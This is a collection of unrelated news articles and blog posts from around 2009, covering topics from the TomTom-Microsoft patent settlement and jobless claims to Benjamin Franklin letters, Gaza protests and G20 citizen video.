" We visited the Detainees camps and we saw the jails , where they shower , how they recreate themselves with movies , classes of art , books .
It was very interesting . "
She goes on to extol the virtues of the water around the bay - " soooo beautiful ! " - and ends her entry : " I did n't want to leave , it was such a relaxing place , so calm and beautiful . "
' Horrendous '
Her comments attracted plentiful news coverage and some ridicule from bloggers , one of whom exclaimed : " My God !
Never underestimate the predictability of stupidity .
This is horrendous . "
Dayana Mendoza 's comments on her blog were in reference to the hospitality she received
Paula M Shugart
Miss Universe Organization president
The blog entry has now been removed from the Miss Universe website .
Instead , a statement from the organisation 's president , Paula M Shugart , has been posted explaining that Ms Mendoza 's visit was part of a programme of " goodwill tours to visit the men and women in uniform who serve our country around the world " .
Ms Mendoza 's comments " were in reference to the hospitality she received while meeting the members of the US military and their families who are stationed in Guantanamo " , the statement explains .

NEW YORK ( CNNMoney.com ) --
The number of Americans filing for first - time unemployment benefits last week edged off a 26 - year high , but was greater than expected , according to a government report released Thursday .
In addition , the number of workers receiving unemployment checks for one week or more spiked by 11,000 to reach a record high of 4.8 million for the week ending Jan. 31 , the most recent data available .
The number of initial jobless claims fell by 8,000 to 623,000 in the week ended Feb. 7 , according to the Labor Department .
That 's down from the upwardly revised tally of 631,000 the previous week .
The latest report ends a run of four straight weeks of rising jobless claims .
Economists polled by Briefing.com were expecting the number to fall to 610,000 for the most recent week .
Ian Shepherdson , chief U.S. economist with High Frequency Economics in New York said his hopes that claims would fall by more than 8,000 were not met .
" The new data reinforces the impression that the underlying pace of layoffs is continuing to rise rapidly , setting the scene for even bigger declines in payrolls , " Shepherdson wrote in a research note .
" The corporate bloodletting took a while to get started , but it is now in full swing and we have no confidence that the peak in claims is near , " he added .
The four - week moving average for weekly claims , used to smooth fluctuations in the data , totaled 607,500 , up 24,000 from the previous week 's revised figure .
The four - week moving average for continuing claims was 4.7 million , an increase of 73,750 from the previous week .
Employers cut 598,000 jobs off of U.S. payrolls in January , taking the unemployment rate up to 7.6 % and making it the worst month for job losses since December 1974 .
Job losses have totaled 1.8 million in just the last three months , or half of the 3.6 million jobs that have been lost since the beginning of 2008 .
The newly struck stimulus bill , if approved by the House and Senate , would provide some assistance to Americans living on unemployment checks .
The bill provides jobless workers with an additional 20 weeks of unemployment benefits , plus 13 weeks more if they live in what 's deemed a high - unemployment state .
In addition , the weekly unemployment benefit would temporarily increase by $ 25 on top of the roughly $ 300 that jobless workers currently receive .
The first $ 2,400 of benefits in 2009 would be exempt from federal income taxes .
Navigation device - maker TomTom has settled its patent dispute with Microsoft , putting an end to the current round of litigation between the two companies .
The terms of the settlement , which were announced by Microsoft on Monday , are said to be fully compliant with GNU 's General Public License ( GPL ) .
The conflict between Microsoft and TomTom , which publicly emerged in February , raised serious concerns within the open source software community .
Microsoft alleged that TomTom 's navigation products , which use the open source Linux kernel , infringe on a handful of Microsoft 's patents .
Two of the patents cited by Microsoft cover legacy compatibility features in Microsoft 's FAT filesystem , support for which is implemented in Linux .
Some feared that the lawsuit was the beginning of a patent litigation campaign by Microsoft against embedded Linux adopters .
TomTom responded to Microsoft 's lawsuit earlier this month by firing back with a coutersuit , alleging that Microsoft had infringed some of its navigation patents .
As the conflict escalated , TomTom joined the Open Invention Network ( OIN ) , an organization that has accumulated a defensive patent portfolio for protecting Linux from patent infringement lawsuits .
This move led to speculation that the dispute could lead to a major patent showdown between the OIN and Microsoft .
That possibility has been averted — for now — by the settlement agreement .
In an announcement Monday , Microsoft and TomTom contend that the terms of the settlement fully conform with TomTom 's obligations under the GPL , the license under which Linux is distributed .
TomTom has paid to license Microsoft 's patents , including those covering FAT .
TomTom will , however , remove the functionality that is covered under the FAT patents .
This will guarantee that the code in TomTom 's Linux kernel can continue to be broadly redistributed downstream without patent encumbrances .
This aspect of the agreement , along with specificity about which patents are infringed , are major factors that differentiate this agreement from Microsoft 's controversial deal with Novell .
" This agreement puts an end to the litigation between our two companies .
It is drafted in a way that ensures TomTom 's full compliance with its obligations under the GPLv2 , and thus reaffirms our commitment to the open source community , " said TomTom IP director Peter Spours in a statement .
TomTom intends to make the requisite changes to the FAT code within the next two years .
The company 's agreement with Microsoft provides a guarantee that it will not sue TomTom users in the interim .
Although the settlement has ended the conflict between Microsoft and TomTom , questions still remain about the implications for FAT in the broader Linux ecosystem .
Microsoft has previously stated that this lawsuit represents an isolated issue and that the company does not intend to broadly sue Linux users .
Upstream kernel developers could potentially adopt TomTom 's code changes in order to avoid future patent disputes with Microsoft over FAT .

From Scoop.co.nz Artwork by Brocke Lever Tuesday , 17 March 2009 , 4:29 pm Press Release : Justice NOW Media Release : Expanded anti-terror squad to silence dissent “ It has been reported that the Army is seeking to expand the Counter Terrorist Tactical Assault Group ( CTTAG ) based on what they say is ‘ a surge [… ]
When the Port Authority announced that what had been portentously known as the Freedom Tower would instead be simply called “ One World Trade Center , ” it was the end of a linguistic era .
Then - governor Pataki ’s symbolically charged name for the 1,776 - foot - tall fortified skyscraper was being replaced by a simple address , however poignant an echo of what had stood there before .
The word “ freedom ” is a complicated one , with a history in the language that stretches back to the time of Old English .
Coincidentally , the week before , the Oxford English Dictionary published an entry for the noun that was revised for the first time since its original publication in 1900 .
It divides the word into 26 distinct senses , not including compounds and derivatives .
“ Freedom fries ” did n’t make the cut .
Freedom is a good thing .
No one would go on record claiming to be opposed to freedom , just as no one would claim to be opposed to peace .
So the pretense that by screaming “ freedom ” loudly enough one could bulldoze through any obstacle was an especially irritating one .
It ’s hard to believe that anyone — regardless of the strength of their patriotism , or their disapproval of the diplomatic position of France regarding the invasion of Iraq — seriously subscribed to the notion that the name of the quintessentially American French fries should be changed to “ freedom fries , ” even if the House of Representatives did just this in its cafeterias in 2003 , right around the time when the Freedom Tower also got its name .
But then again , in 1917 , jingoistically anti-German Americans similarly campaigned for sauerkraut to be renamed “ liberty cabbage . ”
“ Freedom ” seems to be losing its cachet as a cheap rhetorical trick .
In George W. Bush ’s inaugural address in 2005 , he used the word 27 times ; it was his most frequent content word .
But Barack Obama used it only three times in his inaugural ; it came in behind “ nation , ” “ America , ” “ people , ” “ work , ” and “ generation . ”
The superpatriotic uses still linger — Kid Rock ’s current National Guard –recruitment - commercial song , “ Warrior , ” has the chorus “ Freedom ai n’t so free / When you breathe red , white , and blue / I ’m giving all of myself / How ’ bout you ? ” — but by now this jingoistic use seems like a throwback .
Which is why the Freedom Tower lost its name ; as it was signing up tenants ( the first commercial one is a big Chinese company ) , those echoes became a marketing liability .
“ Frankly , we ’ve gotten a very interested and warm reception ” for the name change , Port Authority chairman Anthony Coscia told reporters this week .
Unsurprisingly , Pataki took umbrage , declaring that “ the Freedom Tower is not simply another piece of real estate and not just a name for marketing purposes . ”
But as one source close to the deal told this magazine , “ The way the site was politicized for so many years I think has left a bad taste in the mouths of the people who are actually trying to get things done there . ”
That will allow people to go to work in an office building , instead of in a statement .
I ’ve uploaded Devel : : NYTProf 2.09 to CPAN .
If you ’re using VMS the big news is that Peter ( Stig ) Edwards has contributed patches that enable NYTProf to work on VMS .
Yeah !
Thanks Peter .
For the rest of us there ’s only one significant new feature in this release : NYTProf now includes a heuristic ( that ’s geek for “ it ’ll be wrong sometimes ” ) to handle modules using AutoLoader .
The most common of which are Storable and POSIX .
You may have encountered a warning like this when running nytprofhtml :
Unable to open '/../../lib/Storable.pm ' for reading :
No such file or directory
It ’s a symptom of a deeper problem caused by AutoSplit , the companion to AutoLoader .
The details of the cause , effect , and fix are n’t worth going into now .
If you ’re interested you can read my summary to the mailing list .
The upshot is that NYTProf now reports times for autoloaded subs as if the sub was part of the parent module .
Just what you want .
Time spent in the AUTOLOAD ’er sub is also reported , naturally .
There is a small chance that the heuristic will pick the wrong ‘ parent ’ module file for the autoloaded subroutine file .
That can happen if there are other modules that use the same name for the last portion of the package name ( e.g. , Bar : : Foo and Baz : : Foo ) .
If it ever happens to you , please let me know .
Ideally with a small test case .
The list of changes can be found here ( or here if you ’re a detail fanatic ) .
One other particularly notable item is that the savesrc option was n’t working reliably .
Thanks to Andy Grundman providing a good test case , that ’s now been fixed .
Enjoy !
A very Happy New Year to all !..
Ahh it ’s so nice to be back and blogging .
What I meant about blogging is that I have incredibly valuable information for everyone with regards to staying healthy .
The best approach to keeping your body in tiptop shape is to simply detoxify .
The most natural means of detoxifying is by taking it easy on your body ’s toxins which come from cigarette , alcohol , saturated fats , and even coffee .
Switching to natural alternatives is better .
Following the detoxification procedure is the cleansing .
How ?
By simply living a healthier lifestyle through balanced diet and taking in supplements that provide the nutrients and vitamins required by the body .
Among the best detoxifying solutions is drinking water .
But if you think drinking at least two quarts of water can be too much , opt for supplement water – the healthy substitute .
Apart from drinking water , you should also exercise daily to keep your body up and about .

A trove of Benjamin Franklin letters has turned up in the British Library .
Discovered by University of California , San Diego professor Alan Houston , the letters are copies of correspondence that has n't been seen in more than 250 years .
All dating from the spring and summer of 1755 , the 47 letters by , to and about Franklin are in the hand of one Thomas Birch , a contemporary of Franklin's who was a prodigious - almost inveterate - compiler and transcriber of historical documents .
They are being published for the first time in the April issue of the William and Mary Quarterly .
The letters concern Franklin 's involvement in the first phase of the French and Indian War , specifically General Edward Braddock and what Franklin later called the " wagon affair . "
The French and Indian War is the North American chapter of The Seven Years ' War .
The most important colonial war between Great Britain and France , it resulted , by 1763 , in the French loss of most of its colonial possessions in the New World .
But in 1755 that eventual outcome was not at all clear .
Following George Washington 's defeat at Fort Necessity the previous year , imperial authorities dispatched one of their top commanders , General Braddock , to regain control of the frontier .
Braddock landed in Virginia , tasked with capturing France 's Fort Duquesne in what is today Pittsburgh .
He had been promised , by Virginia and Maryland , 2,500 horses and 250 wagons for his 250 - mile overland march .
Instead , he received only 20 wagons and 200 horses and exploded in anger .
Benjamin Franklin arrived just in the nick of time , offering to arrange the help of Pennsylvania farmers .
Franklin was successful .
Braddock , less so :
The general died in a surprise attack just a few miles shy of the fort .
About 1,000 of his 1,500 men in the field were killed or wounded .
Houston , professor of political science at UC San Diego , was working on his latest book , " Benjamin Franklin and the Politics of Improvement " ( Yale University Press , 2008 ) , when he discovered the new letters .
It was Houston 's last day on his last scheduled trip to England .
( He had been tempted , he said , to join friends for some R&R , but his " Protestant work ethic " won out and he dutifully trudged over to the library . )
The last document he asked to see in the Manuscripts Reading Room of the British Library was catalogued as " Copies of Letters relating to the March of General Braddock " by Thomas Birch .
Birch was a colorful figure and an important man in his own right - a member of the Society of Antiquaries of London and secretary of the Royal Society from 1752 to 1765 - but he " does n't show up in any of the biographies on Franklin , " Houston said .
Houston was n't looking for traces of Franklin in Birch 's handiwork - which numbers an astonishing 400 - plus volumes in the British Library .
Rather , he was combing the archives for documents that might shed light on political and economic dimensions of the Seven Years ' War .
When he saw the innocently titled catalogue item , he thought , " it 's late , but I 'll take a quick glance before I leave . "
" I knew almost instantly what I was looking at , " said Houston , who specializes in the history of political thought .
" Franklin refers to a book of letters concerning the ' wagon affair ' in his ' Autobiography , ' but no one has ever seen it .
Like others , I assumed that it had had not survived . "
He could hardly sit still , Houston recalls , and maintain the decorum appropriate to the august library .
He quickly checked " The Papers of Benjamin Franklin , " Yale University 's definitive edition of Franklin 's writings .
On finding no references to these materials , Houston dashed out to make a middle - of - the - night call to his wife across the Atlantic .
Houston had uncovered individual letters and documents by Franklin before but , he says , " this was a find of a different order of magnitude , the kind that happens only once in a lifetime . "
Scott Casper , visiting editor of the William and Mary Quarterly and professor of American history at the University of Nevada , Reno , said , " ' The Papers of Benjamin Franklin ' has done a remarkable job of collecting Franklin material so it is astonishing to find such a cache of previously unseen letters .
" It is one thing , " Casper said , " to find a single letter , but to find a whole conversation is stunning . "
" It 's a really great story , " he said , " that a diligent scholar who knows what he 's looking at can find what nobody saw . "
In his WMQ essay , " Benjamin Franklin and the ' Wagon Affair ' of 1755 , " Houston documents the relationship between Birch and Franklin .
Birch probably copied Franklin 's letters in 1757 or 1758 , soon after the American arrived in London .
The manuscript is incomplete - Birch copied parts of letters as often as he copied them whole - but it is in remarkably good condition , Houston said .
It includes letters to and from Franklin 's son William ; letters to and from Braddock or his secretary , William Shirley Jr. ; a letter to Franklin 's wife , Deborah ; and a letter from the governor of Massachusetts , William Shirley Sr .
According to the WMQ's Casper , the letters add substance and color to our understanding of the period : " This is not only important to Ben Franklin scholarship , " he said , " but also illuminates an important part of American history . "
Houston writes in the WMQ that the newly discovered Franklin material reveals new details of the " wagon affair . "
It was much harder , for example , to obtain wagons and horses than previously believed .
The traditional story , encouraged by Franklin's own account in his " Autobiography , " is that virtuous Pennsylvania farmers gamely stepped up to the cause .
But the situation was much more complex , Houston says .
Some farmers had to be threatened or cajoled ; others calculated that they could command a higher price by withholding their wagons and making Braddock even more desperate for their help .
Alcohol fueled bitter conflicts , and William Franklin , acting as his father 's agent in the " affair , " feared for his own safety .
Similarly , Franklin's " Autobiography " suggests that he helped supply British junior officers with sugar , cheese , rum and raisins out of simple compassion .
We now know , Houston said , that Braddock 's officers behaved badly , commandeering food and horses as they marched .
Easing the lives of officers was a clever way of bringing relief to put -upon Pennsylvanians .
A macabre detail about Braddock 's catastrophic campaign also emerges :
The much smaller contingent of French and Indians was so unexpectedly successful that they ran out of ammunition and resorted to using coins and buttons .
Because the defeat was seen as not only shocking but also ignominious , this news was relayed , Houston said , in a " hush - hush tone . "
On an entirely different note , a letter from Franklin to Deborah reveals a smidge more marital warmth , said Houston , " than is often allowed . "
" Finally , " writes Houston , " the sheer existence of these letters , sitting quietly on the shelves of the British Library for nearly 250 years , poses a tantalizing question .
Franklin spent 18 years - more than 20 percent of his life - in the United Kingdom .
How many other treasures await to be found ? "

( Coast ) Silk Tassel Bushes or Garrya elliptica are a very unusual plant to come across .
The first time I saw one I was thrilled , I had never paid attention to the rather boring ungainly shrub located at the top of the long perennial border at Playfair Park in Saanich .
It was early in the year and I knew that this garden had a wonderful collection of Rhododendrons which I wanted to check on , they were not in bloom yet , instead I found a Garrya .
The first thing I realized on seeing this plant for the first time is that at other times without its catkins I might have thought it was an Elaegnus which has similar leaves but not flowers .
Garryas are dioecious meaning they are male or female plants ( Holly is another plant like this ) .
They both have long catkins but the males clones are the most prized .
Garrya elliptica ‘ James Roof ’ is the most commonly grown male clone which can have catkins which are up to 12in ( 30 cm ) long .
Garrya ellipticas are true west coasters and do n’t like living far from the ocean , this is because there are smaller temperature swings when closer to a large body of water ( marine effect ) .
Their range extends all along the coast from southern Oregon through California .
There are a total of 18 Garrya species found along the West coast from Washington state through to Panama and east to Texas
Here in Victoria
We live in a rain shadow which keeps us drier and warmer than the the British Columbia mainland .
We have a very moderate climate which is similar to their native habitat of Chaparral , mixed evergreen forest or coastal Sage scrub .
Garryas ’ where first found by David Douglas in 1828 and named for Nicolas Garry who was the Secretary of the Hudson ’s Bay Company .
He assisted Douglas in his explorations in the Pacific Northwest .
Placement of Silk Tassel
Bushes here here is a very tricky thing .
They like full sun to part shade preferably in mixed deciduous trees and shrubs to show off their winter blooms .
The most important thing is to make sure this plant is kept out of the drying burning winds that can occur during a cold snap such as the ones we have during the November to March period .
Best placement is bottoms of slopes or beside walls or fences .
Another use is as a transitional plant from a naturalised setting into the more structured garden .
Garryas are easy to please , for luxuriant growth they ask for no less than 25 in . ( 25 cm ) of rain .
They are not very particular to soil and tolerate clays if they are well drained and nutrient rich .
They will grow into a substantial 12 ft ( 4m ) by 12 ft ( 4m ) multi-stemmed shrub which is deer and rabbit resistant .
They can be lightly pruned after blooming primarily for shape , do not too far down into the bush .
Although these plants can take temperatures as low as 4 f ( - 10 c ) they prefer a warmer climate .
Zones 7 through 10 is recommended .

TROLLHATTAN , Sweden — Saab Automobile may be just another crisis - ridden car company in an industry full of them .
But just as the fortunes of Flint , Mich. , are permanently entangled with General Motors , so it is impossible to find anyone in this city in southwest Sweden who is not somehow connected to Saab .
Which makes it all the more wrenching that the Swedish government has responded to Saab ’s desperate financial situation by saying , essentially , tough luck .
Or , as the enterprise minister , Maud Olofsson , put it recently , “ The Swedish state is not prepared to own car factories . ”
Such a view might seem jarring , coming as it does from a country with a reputation for a paternalistic view of workers and companies .
The “ Swedish model ” for dealing with a banking crisis — nationalizing the banks , recapitalizing them and selling them — has been much debated lately in the United States , with free - market defenders warning of a slippery slope of Nordic socialism .
But Sweden has a right - leaning government , elected in 2006 after a long period of Social Democratic rule , that prefers market forces to state intervention and ownership .
That fact has made the workers of Trollhattan wish the old socialist model were more in evidence .

NGC 1333 Stardust
Credit & Copyright : Stephen Leshin
Explanation : NGC 1333 is seen in visible light as a reflection nebula , dominated by bluish hues characteristic of starlight reflected by dust .
A mere 1,000 light - years distant toward the heroic constellation Perseus , it lies at the edge of a large , star - forming molecular cloud .
This striking close - up view spans about 4 light - years at the estimated distance of NGC 1333 .
It shows details of the dusty region along with hints of contrasting emission in red jets and glowing gas from recently formed stars .
In fact , NGC 1333 contains hundreds of stars less than a million years old , most still hidden from optical telescopes by the pervasive stardust .
The chaotic environment may be similar to one in which our own Sun formed over 4.5 billion years ago .
Anyone who has dealt with the pettiness that often finds itself residing in zoning boards is likely to understand this one completely :
To many in Old Town Alexandria , the sex shop that opened recently on King Street is nothing short of scandalous , a historical desecration just blocks from the boyhood home of Robert E. Lee .
But to Michael Zarlenga , it ’s justice .
Zarlenga spent $ 350,000 on plans to expand his hunting and fishing store , the Trophy Room .
He worked with city officials for almost two years and thought he had their support — until the architectural review board told him he could n’t alter the historic property .
Furious and out of money , Zarlenga rented the space to its newest occupant , Le Tache , which is French for “ the spot . ”
“ I ca n’t say I did n’t know it would ruffle feathers , ” said Zarlenga , 41 .
“ Actually , I was hoping for a fast - food chain because I thought that would be more annoying to the city . ”
As you can imagine , this has ruffled the feathers of quite a few people in Alexandria and has even sent the local prosecutor on a pornography hunt in an effort to find some way to shut the business down .
Considering the way they treated Zarlenga , though , it ’s pretty clear that the City of Alexandria has nobody to blame but itself :
Zarlenga ’s saga with the building dates to 2001 , when he opened his hunting and fishing store .
In 2006 , he bought the building with the idea of renovating and expanding it to include more retail space , a bathroom and an elevator .
He hired a Washington architectural firm , which created eight designs for the project .
The final one included plans to raise the roof on the back of the building and demolish a small section of a historic brick wall that was built about 1800 .
Most of the back wall would have been incorporated into the renovation .
Zarlenga said he consulted Alexandria ’s historical preservation staff along the way to be sure everyone was on board with his plans .
He said he relied heavily on the advice of Peter Smith , who at the time was the principal staff member of the city ’s Board of Architectural Review .
(…) Zarlenga said he felt as though the rug had been pulled out from under him .
He appealed to the City Council but lost in September 2007 .
Council members suggested he go back to the staff of the architectural review board and submit new plans .
For Zarlenga , it was the final straw .
He choked back tears as he told the council he was finished : “ I have no faith in the staff .
. . .
They have completely taken the integrity , as I see it , out of the system .
. . .
The simple fact is there ’s no money left , okay ? ”
And so , he rented the space out to a business sure to ruffle feathers and piss people off , and he ’s not done yet :
[ T] here ’s another piece of Zarlenga real estate that might start causing buzz .
He owns a shuttered , dilapidated building several blocks away at Princess and Royal streets .
Some of the broken windows have been patched with duct tape .
“ As far as I ’m concerned , that corner will always be an eyesore , ” Zarlenga said .
“ That ’s a little slice of revenge . ”
As far as I see it , they have nobody to blame but themselves .
Is homosexuality unnatural ?
Does it threaten society ?
Are gays and lesbians " born that way " -- and does it matter either way ?
In this provocative program , Dr. John Corvino tackles these questions and more .
Combining philosophical rigor with sensitivity and humor , Corvino examines the most common arguments against same - sex relationships - including those based on nature , harm , and religion .

“ Working with Microsoft and director Mason Nicoll ( former creative director at Digital Kitchen and Prologue ) , Seattle - based studio Oh , Hello brought this vision of a highly - gadgetized future to life with some slick roto , loads of tracking and , of course , silky smooth futurific animation .

Nathan Barr of Oh , Hello was kind enough to answer some of the more pragmatic questions I had about the project . ”
In fact , Mr. Williams said that a huge chunk of Twitter lore , etiquette and even terminology has sprouted up from Twitter users without any input from the company .
For example , the people came up with the term “ tweets ” ( what everyone calls the messages ) .
The crowd began referring to fellow Twitterers by name like this : @pogue .
Soon , that notation became a standard shorthand that the Twitter software now recognizes .
The masses also came up with conventions like “ RT , ” meaning re-tweet  you ’re passing along what someone else said on Twitter .
If you asked me to write my own “ Rules for Twitter ” document  No. 927,001 on Google  it would look something like this :
DON’T KNOCK IT TILL YOU’VE TRIED IT
Of course , this advice goes for anything in life .
But listen : even my own masterful prose can’t capture what you ’ll feel when you try Twitter .
So try it .
If you do n’t get any value from it , close the window and never come back ; that ’s fine .
Despite all the press , Twitter is still largely a geek and early - adopter phenomenon at this point .
DON ’T USE THE WEB SITE I could n’t believe that six million Twitter users lumber off to a Web page every time they want to send or read tweets .
Turns out they do n’t .
About 70 percent use sweet little free programs that sit at the edges of their screens ( or run on their cellphones , especially iPhones ) all day .
They have names like TweetDeck , Twitterfeed , Twhirl and Twitterific .
YOU DON ’T HAVE TO READ ALL THE TWEETS
It ’s common to check out someone ’s Twitter profile and read , “ Following : 900 people . ” Baloney .
Nobody has the time to read all the tweets from more than about 30 people  at least , nobody with a life .
Clearly , these high subscribers just read the most recent ones , or skim for good ones , or use search .
twitter.com to find messages on certain subjects .
YOU DON’T HAVE TO ANSWER ALL THE REPLIES
If you have a lot of followers , you get a lot of replies to your tweets .
Fortunately , this is n’t e-mail ; nobody expects you to answer everything .
Those who download illegal copies of music over P2P networks are the biggest consumers of legal music options , according to a new study by the BI Norwegian School of Management .
Researchers examined the music downloading habits of more than 1,900 Internet users over the age of 15 , and found that illegal music connoisseurs are significantly more likely to purchase music than the average , non -P2P - loving user .
Unsurprisingly , BI found that those between 15 and 20 are more likely to buy music via paid download than on a physical CD , though most still purchased at least one CD in the last six months .
However , when it comes to P2P , it seems that those who wave the pirate flag are the most click - happy on services like the iTunes Store and Amazon MP3 .
BI said that those who said they download illegal music for " free " bought ten times as much legal music as those who never download music illegally .
" The most surprising is that the proportion of paid download is so high , " the Google - translated Audun Molde from the Norwegian School of Management told Aftenposten .
Record label EMI does n't quite buy into BI 's stats , though .
EMI 's Bj�rn Rogstad told Aftenposten that the results make it seem like free downloads stimulate pay downloads , but there 's no way to know for sure .
" There is one thing we are not going away , and it is the consumption of music increases , while revenue declines .
It can not be explained in any way other than that the illegal downloading is over the legal sale of music , " Rogstad said .
Rogstad 's dismissal of the findings do n't take into account that the online music model has dramatically changed how consumers buy music .
Instead of selling a huge volume of full albums — the physical media model — the record labels are now selling a huge volume of individual , cherry - picked tracks .
It 's no secret that the old album format is in dire straits thanks to online music , which is a large part of why overall music revenue is going down .
BI 's report corroborates data that the Canadian branch of the RIAA , the Canadian Record Industry Association , released in 2006 .
At that time , the organization acknowledged that P2P users do indeed buy more music than the industry wants to admit , and that P2P is n't the primary reason why other people are n't buying music .
73 percent of of respondents to the CRIA 's survey said that they bought music after they downloaded it illegally , while the primary reason from the non -P2P camp for not buying music was attributed to plain old apathy .
Demonstrators hurl shoes at Downing Street in day of global protest against Israeli attacks
Demonstrators demanding an end to Israeli airstrikes on Gaza hurled their shoes at the gates of Downing Street yesterday during a wave of global protests .
Riot police were also pelted with missiles and fireworks as about 5,000 pro-Palestinians descended on the Israeli Embassy in London in the evening .
Earlier in the day , around 12,000 people marched through the centre of the capital , including singer Annie Lennox , human rights campaigner Bianca Jagger and former mayor Ken Livingstone .
London : Hundreds of shoes litter Whitehall , near Downing Street
Elsewhere in Britain , 2,000 demonstrators took to the streets in Manchester and 500 braved the cold in Edinburgh .
Paris held the world ’s biggest protest , with 25,000 people showing up to condemn the Israeli offensive , which has killed at least 436 Palestinians since December 27th .
The death toll includes 75 children , according to Gaza medics .
And almost 2,300 people have been wounded inside the territory .
Four Israelis have been killed by rocket attacks by Hamas , Islamist militants who took over Gaza three years ago .
In Britain , many people were angry at Gordon Brown refusal to condemn Israel ’s attacks .
Hundreds of protesters threw shoes at the iron gates of Downing Street residence , in the spirit of an Iraqi journalist who hurled his footware at President George Bush last year .
About 12,000 people are estimated to have taken part in the rally
Around 1,000 pairs littered the streets outside Number 10 with demonstrating singing : ‘ Shame on you , have my shoe . ’
Zac Sommer , an 18 - year - old British - Palestinian student from Essex , said : ‘ Britain is quick to condemn Robert Mugabe , but where is the condemnation of Israel ?
Israel is killing hundreds of people . ’
Also outside Downing Street , a firework exploded yards from the gates .
Later , around 5,000 protesters left the agreed marching route between Embankment and Trafalgar Square and headed for the Israeli Embassy in Kensington .
Hundreds of officers with truncheons and gas canisters locked shields during a stand - off outside the building .
Clash : Riot police deal with protesters trying to raid the Israeli Embassy in London
Focus point : Around 5,000 people went to the embassy after the march
Demonstrators taunted police , burned Israeli flags and threw sticks and stones at the diplomatic mission .
Others attempted unsuccessfully to storm the compound while officers were pelted with missiles and fireworks .
Ten people were arrested .
The demonstration in the capital was the biggest of at least 18 organised across the country .
Other rallies took place in Glasgow , Exeter , Bristol , Liverpool , Norwich , Hull , Tunbridge Wells , Leeds , Newcastle , Swansea , York , Caernarfon , Bradford and Sheffield .
Anger : Protesters gather in Trafalgar Square at the end of the march
Support : Annie Lennox , centre , is flanked by George Galloway and Bianca Jagger
Condemnation : Musician Brian
Eno speaks out against the Israeli attacks
Human rights advocate Bianca Jagger and singer Lennox have backed the protests , calling on American president - elect Barack Obama to speak up against the bombardment .
Speaking at a press conference in central London , Ms Jagger said : ‘ I would like to make an appeal to president - elect Obama to speak up .
‘ People throughout the world were hopeful when he was elected and we must appeal to him to ask for the immediate cessation of the bombardment of the civilian population in the Gaza Strip . ’
Lennox spoke of her shock at watching scenes of the bombing on television .
She said : ‘ A few days after Christmas I came downstairs , put the television on , and saw smoke pyres coming from buildings and I was shocked to the core because I was thinking as a mother and as a human being .
Madrid : Protesters burn an Israeli flag in the Spanish capital
Paris : Demonstrators burned cars after a march by 25,000 people
Berlin : Some 7,000 Palestinian supporters outside the city 's cathedral
‘ How was this going to be the solution to peace ? ’
She said the intervention from Bush blaming Hamas for starting the violence , had not helped the situation .
‘ The problem is , from my perspective , they are pouring petrol onto the fire , ’ she said .
‘ They have to sit down .
This is a small window of opportunity just before things kick off .
‘ For every one person killed in Gaza , they are creating 100 suicide bombers .
It ’s not just about Gaza , it ’s about all of us . ’
Liberal Democrat Sarah Teather said Israel ’s military response to the firing of Hamas rockets had been ‘ disproportionate ’ .
Amsterdam : A man holds up a blood smeared doll
Milan : Demonstrators carry a simulated body of a Palestinian
‘ Anyway , what Israel is doing is counter - productive .
No terrorist organisation has ever been bombed into submission , ’ the Liberal Democrat MP said .
Police said 8,000 people demonstrated in the central French city of Lyon , 3,000 people protested in the southern city of Nice and 3,800 in Mulhouse in the east .
Two people were arrested as more than 1,000 marched through Amsterdam , condemning the Israeli airstrikes on Gaza and calling for a boycott of Israeli goods , police said .
Hundreds protested in Madrid , carrying signs saying ‘ This is not a war but a genocide ’ .
More than 2,000 people also demonstrated in the Austrian city of Salzburg .

LONDON — When
London ’s mobile CCTV cameras were shut down by a legal ruling two days before the G20 protests in London , conspiracy theorists suggested that the blackout had been contrived so that the police could be let off the reins .
Without CCTV , there would be no record of official wrongdoing .
It was a neat theory , but naively old - fashioned in its assumption that the state had a monopoly on surveillance .
The emergence of amateur video showing Ian Tomlinson , the man who had a heart attack on the day of the protests , being pushed to the ground by a police officer soon before he died .
It clearly demonstrates that for every camera pointed at you by Big Brother , there are 10 more pointed back by Little Brother —
an informed , digitally savvy civilian population that has the tools to record anything , anytime , anywhere .
Extensive networks of fixed cameras throughout Britain remain the preserve of the authorities , but these are essentially dumb systems monitoring empty streets in the hope that something significant will happen when they ’re pointing in the right direction .
An informal network of passersby with camera phones creates a crowdsourced , peer - to - peer network of citizen surveillance .
Footage trapped in a phone is of limited power , but coupled with the integrated network of the old and new media , it is set free .
The Guardian , which obtained the footage exclusively , led its print edition with a freeze - frame from the video and its website with the video itself .
However , rather than trying to keep the exclusive to itself , it posted the video on YouTube , inviting other sites and blogs to use the footage .
Faced with such a compelling piece of video , would the competition look the other way ?
Not a bit of it .
Times Online also lead with the Guardian
footage , branded throughout with its rival ’s logo , because the grainy footage could n’t be ignored .
That ’s a big philosophical change for a news organization , and an indication of the power of the web .
We ’ve grown used to the idea that amateur footage will trump the professionals in the moments after air crashes , floods and fires , but we have n’t yet grasped what that does to the balance of power between the state , the media and the individual .??
Surveillance is still talked of as something done to us by them , but increasingly it ’s something done to everyone by everyone else .
What that means for the authorities is that they can no longer control the flow of information about their actions .
They have n’t yet stopped trying .
Without the camera work of the New
York fund manager who captured some of Tomlinson ’s last moments , the final word on his death would have gone to the police : " [ He ] suffered a sudden heart attack while on his way home from work . "
The week - old footage that emerged today does not contradict that official statement , but it widens the lens through which we see the event , and it changes our perspective .
Instead of the sober , considered response of a senior media - trained officer , calmly delivered hours after the event , we ’re in the thick of the action .
It ’s messy footage of jeering protesters and a policeman lunging at a middle - age man , who stumbles to the ground .
It leaves little room for complacency .
The picture we see remains incomplete .
We do n’t see what happened before the camera started rolling and we barely see the baton strike .
If only we could see it from another angle , if only we could hear what was said .
As more evidence emerges and more footage surfaces , we may .
The reaction to this incident , like the fears about blacked - out
CCTV , illustrate an interesting shift in attitude towards surveillance .
People normally opposed to cameras are , for the moment , looking to them to protect civil liberties and guard the little guy against the threat of state oppression .
The story brings to mind Cory Doctorow ’s novel , Little Brother , which examines how smart , tech - savvy individuals can level the playing field against agents of the state by using their own understanding of digital tools to subvert and confront them .
The footage of the attack on Tomlinson demonstrates the moral neutrality of technology :
The cameras routinely used by the state to gather information on demonstrators conducting legal , peaceful protests , or to record witness confessions , are now pointing both ways .
The people who broke RBS ’s windows during the G20 demonstrations will have to deal with the consequences of their actions because of video evidence .
So too will the police officer who pushed Tomlinson over , in what seems , at this stage , to have been an unprovoked assault .
It ’s not much of a stretch to imagine that in the near future we will see a police officer killing a suspect on camera , with all the strange implications for due process and public opinion that a visual record of such violence would entail .
The death of Jean Charles de
Menezes , shot by the police after the London bombings , would have been recorded , if one of the Tube ’s cameras had not been out of order .
